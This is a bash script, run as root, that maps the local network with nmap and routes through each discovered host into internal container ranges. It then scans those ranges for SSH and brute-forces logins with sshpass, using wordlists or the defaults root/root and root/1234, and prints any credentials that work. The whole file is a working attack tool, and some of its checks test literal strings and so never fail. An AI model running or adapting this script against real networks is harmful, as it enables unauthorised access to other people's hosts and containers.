#!/usr/bin/env bash

set -e

if [ "$EUID" -ne 0 ]
	then echo "Please run as root"
	exit
fi

function print_usage {
	echo "Usage $0 [OPTION]"
	echo
	echo "Options are:"
	echo "  -n, --network=NETWORK        the nerwork that contains te physical machine (192.168.1.0/24)"
	echo "  -i, --interface=INTERFACE    the interface connected to the network (eth0)"
	echo "  -s, --scan=SCAN              the ranges to be scanned inside the physical machines (172.17.0.0/24,10.0.3.0/24)"
	echo "  -u, --usernames=FILE         a file containing the list of usernames to be tried"
	echo "  -p, --passwords=FILE         a file containing the list of passwords to be tried"
	echo "  -h, --help                   print this help"
	exit $1
}

SHORT=n:i:s:u:p:h
LONG=network:,interface:,scan:,usernames:,passwords:,help

ARGS=$(getopt --options $SHORT --longoptions $LONG --name "$0" -- "$@" || print_usage 254)
eval set -- "$ARGS"

while true; do
    case "$1" in
        -i|--interface)
            interface="$2"
            shift 2
            ;;
        -n|--network)
            network="$2"
            shift 2
            ;;
        -s|--scan)
            scan="$2"
            shift 2
            ;;
        -u|--usernames)
            usernames="$2"
            shift 2
	    ;;
        -p|--passwords)
            passwords="$2"
            shift 2
	    ;;
        -h|--help)
            print_usage 0
            shift 1
	    exit 0
	    ;;
        --)
            shift
            break
            ;;
        *)
            echo "Bug"
            exit 3
            ;;
    esac
done

if [ -z "$network" ]; then
	if [ -z "$interface" ]; then
		interface=$(ip route | grep default | head -1 | grep -Po 'dev [a-z0-9@]+' | cut -d ' ' -f 2)
	fi
	if [ -z "$interface" ]; then
		ip=$(ip route | grep default | head -1 | grep -Po 'via [0-9.]+' | cut -d ' ' -f 2)
		interface=$(ip route get $ip | head -1 | grep -Po 'dev [a-z0-9@]+' | cut -d ' ' -f 2)
	fi
	if [ -z "$interface" ]; then
		echo "Counld not find interface, check if there is a problem or pass it or the network to scan manually"
		exit 1
	fi
	# TODO: will fail in case of multiple ips
	network=$(ip a show $interface | grep -Po 'inet [0-9./]+' | head -n 1 | cut -d ' ' -f 2)
else
	if [ -n "$interface" ]; then
		echo "Found network and interface, please only pass one of them"
		exit 2
	fi
fi

if [ -z "network" ]; then
	echo "Unable to find the network to scan, please pass it manually"
	exit 3
fi

# TODO: fix passing fds as arguments
# for example # $0 --usernames <(echo root ubuntu)
if [ -n "$usernames" ]; then
	us="$(cat $usernames)"
else
	us="root"
fi
if [ -n "$passwords" ]; then
	ps="$(cat $passwords)"
else
	ps="root 1234"
fi

if [ -z "$scan" ]; then
	scan="172.17.0.0/24"
fi

scan=(${scan//,/ })

for ip in $(nmap -sn $network | grep "scan report" | grep -Po "[0-9.]+"); do
	if [ -n "$(ip route get $ip | grep local || true)" ]; then
		continue
	fi
	for net in $scan; do
		prev=$(ip route | grep "^$net " || true)
		if [ -n "$prev" ]; then
			ip route delete $prev
			trap "{ ip route add $prev; }" EXIT
		fi
		ip route add $net via $ip
		trap "{ ip route delete $net via $ip; ip route add $prev; }" EXIT
		found=$(nmap -PA --open -p 22 $net | grep "scan report" | grep -Po "[0-9.]+")
		if [ -n found ]; then
			# echo "Found ips for host $ip:\n$found"
			for found_ip in $found; do
				for u in $us; do
					for p in $ps; do
						# echo "trying ($u,$p) for $found_ip on $ip"
						failed=$(sshpass -p"$p" ssh $u@$found_ip -n -o StrictHostKeyChecking=no > /dev/null 2> /dev/null || echo failed)
						if [[ -z "$failed" ]]; then
							echo "Found ($u,$p) for $found_ip on $ip"
						fi
					done
				done
			done
		fi
		ip route delete $net via $ip
		if [ -n "$prev" ]; then
			ip route add $prev
		fi
		trap "" EXIT
	done
done

